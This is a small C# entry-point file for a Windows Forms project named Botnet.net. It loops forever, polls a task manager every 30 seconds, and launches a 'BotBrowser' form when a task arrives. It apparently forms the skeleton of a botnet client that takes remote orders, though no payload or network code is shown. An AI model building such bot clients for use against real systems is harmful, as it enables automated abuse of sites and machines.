using System;
using System.Collections.Generic;
using System.Threading;
using System.Windows.Forms;

using BotLib;

namespace Botnet.net
{
    static class Program
    {
        /// <summary>
        /// Главная точка входа для приложения.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            Task task;
            while (true)
            {
                if (TaskManager.TryGetTask(out task))
                {
                    BotBrowser bot = new BotBrowser();//Инициализация бота
                    Application.Run(bot);
                }
                Thread.Sleep(30000);//Задержка между сеансами в пол минуты
            }
        }
    }
}
